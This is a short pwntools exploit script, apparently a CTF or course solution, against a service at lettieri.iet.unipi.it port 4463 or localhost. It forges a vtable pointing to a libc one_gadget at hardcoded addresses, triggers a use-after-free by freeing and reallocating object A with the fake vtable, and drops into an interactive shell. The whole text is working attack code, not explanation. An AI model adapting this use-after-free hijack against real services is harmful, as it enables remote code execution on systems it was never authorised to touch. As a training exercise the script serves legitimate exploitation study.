from pwn import *

def get_process():
    if args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4463)
    else:
        return remote('localhost', 4463)
    
libc = ELF('./libc.so.6')

one_gadget_offset = 0xcbd20
libc_base = 0x00007ffff7c38000
p = get_process()


 # create vtable pointing to one_gadget
p.sendline(b'cV08')
vtable_addr = int(p.recvline().strip(), 16)
log.info(f'vtable address: {hex(vtable_addr)}')
one_gadget_addr = libc_base + one_gadget_offset
log.info(f'one_gadget address: {hex(one_gadget_addr)}')
p.sendline(b'aV' + p64(one_gadget_addr))

# use after free to trigger the one_gadget
p.sendline(b'oAb00')
p.sendline(b'DA')
# sanirty check
addr1 = p.recvline().strip()
p.sendline(b'cK16')
addr2 = p.recvline().strip()
# we should get the same address since the object is freed
if addr1 != addr2:
    log.error('UAF failed!')
    exit()

p.sendline(b'aK' + p64(vtable_addr) + p64(0))
p.sendline(b'uA') # trigger use after free - use object A
p.interactive()